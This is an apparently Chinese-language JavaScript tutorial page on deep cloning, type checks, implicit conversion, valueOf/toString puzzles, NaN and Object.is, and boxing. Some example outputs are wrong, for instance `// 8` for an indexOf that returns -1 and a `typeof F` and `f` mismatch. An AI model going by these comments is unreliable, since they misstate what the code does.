    newObj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'object'</span><span class="token operator">?</span> <span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> 
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> newObj<span class="token punctuation">;</span>
<span class="token punctuation">}</span> 

<span class="token keyword">function</span> <span class="token function">deepClone</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//第二种方式；跟方式一类似；</span>
  <span class="token keyword">let</span> result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj <span class="token operator">==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token function">isArray</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">isObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">isArray</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    result <span class="token operator">=</span> obj
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">isObject</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;[object Object]&quot;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">isArray</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;[object Array]&quot;</span>
<span class="token punctuation">}</span>
<span class="token comment">//定义检测数据类型的功能函数 </span>
<span class="token keyword">function</span> <span class="token function">checkedType</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
	<span class="token keyword">return</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//获取从第九个到倒数第二个字符</span>
<span class="token punctuation">}</span><span class="token comment">//targetType ==='Object'; 比如[object String]获取 String</span>

<span class="token keyword">function</span> <span class="token function">isObject</span> <span class="token punctuation">(</span><span class="token parameter">obj<span class="token operator">:</span> any</span><span class="token punctuation">)</span><span class="token operator">:</span> Boolean <span class="token punctuation">{</span><span class="token comment">// 借鉴 Vue 源码的 object 检测方法</span>
  <span class="token comment">//typeof null === 'object';null 是基础类型，不是 Object,故要先排除这种情况；</span>
  <span class="token keyword">return</span> obj <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> obj <span class="token operator">===</span> <span class="token string">'object'</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><h4 id="_4-隐式-显示-强制转换"><a href="#_4-隐式-显示-强制转换" class="header-anchor">#</a> 4:隐式/显示/强制转换</h4> <h5 id="隐式转换规则"><a href="#隐式转换规则" class="header-anchor">#</a> 隐式转换规则</h5> <ul><li>1、转成string类型： +（字符串连接符）</li> <li>2、转成number类型：++/--(自增自减运算符) + - * / %(算术运算符) &gt; &lt; &gt;= &lt;= == != === !=== (关系运算符)</li> <li>3、转成boolean类型：!（逻辑非运算符)</li></ul> <p><strong>switch case得注意类型</strong>，比如type是int或者string类型；通过type = +type转换成int类型;【++type】</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">&quot;01&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;b=&quot;</span> <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//b=1</span>
<span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">&quot;09/08/2009&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;c=&quot;</span> <span class="token operator">+</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//c=9</span>

<span class="token comment">//2+5+'3' //73  //由于2和5是整数，它们将以数字形式相加。因为3是一个字符串，它将与 7 拼接，结果是73。</span>

<span class="token keyword">var</span> y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  y <span class="token operator">+=</span> <span class="token keyword">typeof</span> <span class="token constant">F</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1undefined</span>
<span class="token comment">//eval(function f(){})返回函数f(){}(为真)。因此，在if语句中，执行typeof f返回undefined，</span>
<span class="token comment">//因为if语句代码在运行时执行，而if条件中的语句在运行时计算。</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h5 id="valueof与tostring"><a href="#valueof与tostring" class="header-anchor">#</a> <strong><code>valueOf与toString</code></strong></h5> <p><strong>类型转换逻辑</strong>：所有对象都有valueOf方法，<strong>valueOf方法对于：如果存在任意原始值，它就默认将对象转换为表示它的原始值。</strong></p> <blockquote><p><strong>类型先通过 <code>valueOf</code> 再 <code>toString</code> 进行隐式转换</strong>;</p></blockquote> <p>注意new跟不new包装对象的区别； constructor跟constructor()的区别；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> n1<span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[Number: 0]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[Function: Number]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0</span>

<span class="token keyword">var</span> n2<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Number</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//包装对象</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[Number: 1]</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> n1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//number</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> n2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// object;包装对象；</span>
<span class="token comment">//所有对象都有valueOf方法，valueOf方法对于：如果存在任意原始值，它就默认将对象转换为表示它的原始值。</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n2<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>
  value<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
  <span class="token function-variable function">valueOf</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr1 <span class="token operator">==</span> <span class="token operator">!</span>arr2<span class="token punctuation">)</span> <span class="token comment">// -&gt; true</span>
arr1<span class="token punctuation">.</span><span class="token function-variable function">toString</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">1</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr1 <span class="token operator">==</span> <span class="token operator">!</span>arr2<span class="token punctuation">)</span> 
<span class="token comment">// -&gt; 111</span>
<span class="token comment">// -&gt; false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><blockquote><h4 id="结果是什么"><a href="#结果是什么" class="header-anchor">#</a> [] == ![] 结果是什么？</h4></blockquote> <p><strong>分析</strong>：</p> <p>右边</p> <ol><li><strong>由于 <code>!</code> 优先级比 <code>==</code> 高，先执行 <code>!</code></strong></li> <li><code>![]</code> 得到 false</li> <li>进行 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Equality_comparisons_and_sameness" target="_blank" rel="noopener noreferrer">相等性判断<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>详见【上面的==类型的转换过程】</li> <li><code>false</code> 转化为数字 <code>0</code></li></ol> <p>左边</p> <ol><li>执行 <code>[].valueOf()</code> 原始值 还是 []</li> <li>执行 [].toString() 得到 ''</li> <li><code>''</code> 转化为数字 <code>0</code></li></ol> <p>所以：<code>0 == 0</code> ，答案是 <code>true</code></p> <blockquote><h4 id="a-1-a-2-a-3-有可能是-true-吗"><a href="#a-1-a-2-a-3-有可能是-true-吗" class="header-anchor">#</a> (a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3) 有可能是 true 吗？</h4></blockquote> <p><strong>对象类型转换</strong></p> <blockquote><p>当两个类型不同时进行==比较时，会将一个类型转为另一个类型，然后再进行比较。 比如<code>Object</code>类型与<code>Number</code>类型进行比较时，<code>Object</code>类型会转换为<code>Number</code>类型。 <strong><code>Object</code>转换为<code>Number</code>时，会尝试调用<code>Object.valueOf()</code>和<code>Object.toString()</code>来获取对应的数字基本类型。</strong></p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 第一种方法</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>
  i<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token function-variable function">toString</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> a<span class="token punctuation">.</span>i<span class="token operator">++</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">// true</span>

<span class="token comment">// 第二种方法</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
a<span class="token punctuation">.</span>join <span class="token operator">=</span> a<span class="token punctuation">.</span>shift<span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>

<span class="token comment">// 第三种方法</span>
<span class="token keyword">var</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">++</span>val<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p><strong>defineProperty</strong></p> <blockquote><p>使用一个<code>defineProperty</code>，让 <code>a</code> 的返回值为三个不同的值。</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token comment">// 这里要window，这样的话下面才能直接使用a变量去 ==</span>
    <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">++</span>val<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h5 id="nan"><a href="#nan" class="header-anchor">#</a> NaN</h5> <p><strong>提示：</strong> 请使用 <code>isNaN()</code> 来判断一个值是否是数字。原因是 <code>NaN</code> 与所有值都不相等，包括它自己。</p> <p><strong>Object.is()</strong>:用来比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致;不同之处只有两个：<strong>一是+0不等于-0，二是NaN等于自身。</strong><code>Object.is(v1, v2)</code> 修复了 <code>===</code> 的一些BUG <code>(-0和+0, NaN和NaN)</code>：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">+</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">0</span> <span class="token comment">//true           NaN === NaN//false    </span>
Object<span class="token punctuation">.</span><span class="token function">is</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//false  Object.is(NaN, NaN) //true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>NaN 是非常特殊的值，<code>它不和任何类型的值相等，包括它自己，同时它与任何类型的值比较大小时都返回false</code>;<strong>有Object.is方法后就不是了</strong>；</p> <p>示例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//number</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//undefined</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//object</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h6 id="特点"><a href="#特点" class="header-anchor">#</a> 特点</h6> <ul><li>NaN不等于自身，也就是 <code>NaN === NaN</code> 为 <code>false</code></li> <li>NaN为假值，转布尔值为<code>false</code></li> <li>NaN本质是一个number，<code>typeof NaN === number</code></li></ul> <h6 id="各种区别"><a href="#各种区别" class="header-anchor">#</a> 各种区别</h6> <blockquote><h4 id="isnan-与-number-isnan的区别"><a href="#isnan-与-number-isnan的区别" class="header-anchor">#</a> isNaN 与 Number.isNaN的区别？</h4></blockquote> <ul><li>isNaN：除了判断NaN为true，还会把不能转成数字的判断为true，例如'xxx'</li> <li>Number.isNaN：只有判断NaN时为true，其余情况都为false</li></ul> <blockquote><h4 id="与-及object-is-的区别"><a href="#与-及object-is-的区别" class="header-anchor">#</a> <code>==</code> 与 <code>===</code> 及Object.is()的区别</h4></blockquote> <p><strong>== : 只进行值的比较,会进行数据类型的转换。 === : 不仅进行值得比较，不进行转换。还要进行数据类型的比较。</strong></p> <p><code>==</code> 与 <code>===</code> 的区别在于: <code>==</code> 运算发生的隐式类型转换，而 <code>===</code> 在执行比较运算前<em>不会发生隐式的类型转换</em></p> <blockquote><p><strong>一言以蔽之</strong>：<code>==</code>先转换类型再比较，<code>===</code>先判断类型，如果不是同一类型直接为<code>false</code>。</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>a<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span> <span class="token operator">==</span> <span class="token string">&quot;[object Object]&quot;</span> <span class="token comment">//true, 左边会执行 .toString()</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>Object.is()</strong>:用来比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致;不同之处只有两个：<strong>一是+0不等于-0，二是NaN等于自身。</strong><code>Object.is(v1, v2)</code> 修复了 <code>===</code> 的一些BUG <code>(-0和+0, NaN和NaN)</code>：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">+</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">0</span> <span class="token comment">//true           NaN === NaN//false    </span>
Object<span class="token punctuation">.</span><span class="token function">is</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//false  Object.is(NaN, NaN) //true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h5 id="js的装箱和拆箱"><a href="#js的装箱和拆箱" class="header-anchor">#</a> JS的装箱和拆箱</h5> <p>**装箱：**把基本数据类型转化为对应的引用数据类型的操作</p> <p>看以下代码，s1只是一个基本数据类型，他是怎么能调用<code>indexOf</code>的呢？</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> s1 <span class="token operator">=</span> <span class="token string">'samy_'</span>
<span class="token keyword">const</span> index <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token comment">// 4</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>原来是JavaScript内部进行了装箱操作</p> <ul><li>1、创建String类型的一个实例；</li> <li>2、在实例上调用指定的方法；</li> <li>3、销毁这个实例；</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">'samy'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> index <span class="token operator">=</span> temp<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span>
temp <span class="token operator">=</span> <span class="token keyword">null</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token comment">// 8</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>**拆箱：**将引用数据类型转化为对应的基本数据类型的操作</p> <p>通过<code>valueOf</code>或者<code>toString</code>方法实现拆箱操作</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> objNum <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Number</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">var</span> objStr <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">&quot;123&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token keyword">typeof</span> objNum <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//object</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token keyword">typeof</span> objStr <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//object </span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token keyword">typeof</span> objNum<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//number</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token keyword">typeof</span> objStr<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//string</span>

